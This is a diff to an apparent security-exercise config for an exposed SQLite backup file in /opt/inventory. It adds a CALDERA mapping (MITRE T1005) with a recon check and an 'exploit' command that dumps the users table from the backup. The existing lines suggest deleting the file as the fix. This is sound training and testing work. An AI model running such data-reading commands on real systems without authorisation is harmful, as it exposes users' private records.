@@ -18,3 +18,16 @@ hints:
   - "Check for .bak files in /opt/inventory/"
   - "Delete the backup file: rm /opt/inventory/inventory.db.bak"
 suggested_fix: "rm /opt/inventory/inventory.db.bak"
+caldera:
+  tactic: collection
+  technique:
+    attack_id: T1005
+    name: "Data from Local System"
+  recon:
+    description: "Check if exposed database backup file exists"
+    command: |
+      test -f /opt/inventory/inventory.db.bak && echo "VULNERABLE: database backup file exposed" || echo "SECURE: no backup file found"
+  exploit:
+    description: "Exfiltrate exposed database backup"
+    command: |
+      sqlite3 /opt/inventory/inventory.db.bak ".tables" 2>/dev/null && sqlite3 /opt/inventory/inventory.db.bak "SELECT * FROM users LIMIT 5;" 2>/dev/null
